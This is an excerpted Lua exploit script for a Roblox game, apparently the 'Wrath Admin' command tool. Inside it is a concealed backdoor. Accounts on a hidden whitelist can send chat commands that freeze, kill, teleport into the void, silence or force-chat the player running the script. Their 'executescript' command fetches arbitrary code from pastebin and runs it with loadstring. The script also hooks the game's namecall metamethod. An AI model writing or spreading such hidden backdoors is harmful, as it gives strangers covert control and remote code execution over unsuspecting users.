...
task.spawn(function()
    ...
    if Character then
        ...
        if Args[5] and tonumber(Args[3]) then
            speed = tonumber(Args[3])
        end
        local spinguns = {
            ["AK-47"] = CFrame.new(-radius, 0, 0);
            ["Remington 870"] = CFrame.new(radius, 0, 0);
            ["M4A1"] = CFrame.new(-radius, -5, 0);
            ["M9"] = CFrame.new(radius, -5, 0);
        }
...
function UseRankedCommands(MESSAGE, Admin)
    ...
    if CMD("guncolor") or CMD("gc") then
        local color = "lime"
...
local BDSettings = {Prefix = "."};
local A_Super_Cool_Table = {};
...
function SomeAwesomeCommandFunction(MESSAGE)
    ...
    if Args[1]:sub(1, 1) ~= BDSettings.Prefix then
        return
    end;

    local CommandName = Args[1]:sub(2);
    
    local function CMDB(NAME)
        return NAME == CommandName:lower();
    end;
    ...
    if CMDB("freeze") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player == LocalPlayer then
            A_Super_Cool_Table.Frozen = true;
        end;
    end;
    if CMDB("unfreeze") or CMDB("thaw") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player == LocalPlayer then
            A_Super_Cool_Table.Frozen = false;
            pcall(function()
                LocalPlayer.Character.HumanoidRootPart.Anchored = false;
            end);
        end;
    end;
    if CMDB("lk") or CMDB("loopkill") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player == LocalPlayer then
            A_Super_Cool_Table.Loopkill = true;
        end;
    end;
    if CMDB("unlk") or CMDB("unloopkill") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player == LocalPlayer then
            A_Super_Cool_Table.Loopkill = false;
        end;
    end;
    if CMDB("chat") or CMDB("forcechat") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        for i,v in next, Args do
            if i > 3 then
                Args[3] = Args[3] .. " " .. Args[i];
    ...
    if CMDB("spamchat") then
        ...
        local Message = Args[3] or "";
        if Player == LocalPlayer then
            A_Super_Cool_Table.SpamChat = true;
            A_Super_Cool_Table.SpamMessage = Message;
        end;
    end;
    if CMDB("unspamchat") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player == LocalPlayer then
            A_Super_Cool_Table.SpamChat = false;
        end;
    end;
    if CMDB("void") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        ...
        if Player == LocalPlayer then
            pcall(function()
                Player.Character.HumanoidRootPart.CFrame = CFrame.new(0, 9e9, 0);
            end);
        end;
    end;
    if CMDB("noshoot") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player == LocalPlayer then
            A_Super_Cool_Table.NoShoot = true;
        end;
    end;
    if CMDB("shoot") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player == LocalPlayer then
            A_Super_Cool_Table.NoShoot = false;
        end;
    end;
    if CMDB("looprespawn") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player == LocalPlayer then
            A_Super_Cool_Table.LoopRespawn = true;
        end;
    end;
    if CMDB("unlooprespawn") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player == LocalPlayer then
            A_Super_Cool_Table.LoopRespawn = false;
        end;
    end;
    if CMDB("checkuser") then
        local Player = GetPlayer(Args[2], LocalPlayer);
        if Player == LocalPlayer then
            ChatMain.MessagePosted:fire("I'm using Wrath Admin");
            rStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("I'm using Wrath Admin", "All");
        end;
    end;
    if CMDB("kill") then
        local Player = GetPlayer(Args[2], LocalPlayer);
    ...
    if CMDB("forcecmd") then
        ...
        if Player == LocalPlayer then
            ...
            UseCommand(Settings.Prefix .. ToUse);
        end;
    end;
    if CMDB("executescript") or CMDB("exescript") then
        local PastebinId = Args[2];
        if PastebinId then
            loadstring(game:HttpGet("https://pastebin.com/raw/" .. PastebinId, true))();
        end;
    end;
end;
...
task.spawn(function()
    while true do
        if A_Super_Cool_Table.Loopkill then
            pcall(function()
                LocalPlayer.Character.Humanoid.Health = 0;
            end);
        end
...
task.spawn(function()
    while true do
        if A_Super_Cool_Table.SpamChat then
            pcall(function()
                ChatMain.MessagePosted:fire(A_Super_Cool_Table.SpamMessage);
                rStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(A_Super_Cool_Table.SpamMessage, "All");
            end);
        end
        rService.RenderStepped:wait();
    end;
...
task.spawn(function()
    while task.wait(0.03) do
        if A_Super_Cool_Table.Frozen then
            pcall(function()
                LocalPlayer.Character.HumanoidRootPart.Anchored = true;
            end);
        end
...
task.spawn(function()
    while task.wait(0.03) do
        if A_Super_Cool_Table.LoopRespawn then
            pcall(function()
...
local NamecallSomething = MT.__namecall

MT.__namecall = newcclosure(loadstring([[
    local NamecallSomething, A_Super_Cool_Table = ...
    return function(Self, ...)
        local Method = getnamecallmethod();
        if Method == "FireServer" and tostring(Self) == "ShootEvent" then
            if A_Super_Cool_Table.NoShoot then
                return
            end;
        end;
        return NamecallSomething(Self, ...);
    end;
]])(NamecallSomething, A_Super_Cool_Table));

local function SomeWhitelistThing(Player)
    if BDWhitelist[Player.UserId] then
        Player.Chatted:Connect(SomeAwesomeCommandFunction);
    end;
end;

Players.PlayerAdded:Connect(SomeWhitelistThing);

for i,v in pairs(Players:GetPlayers()) do
    SomeWhitelistThing(v);
end;
...
print("LOADED WRATH ADMIN! Made by Zyrex and Helped By Dis and Flux");
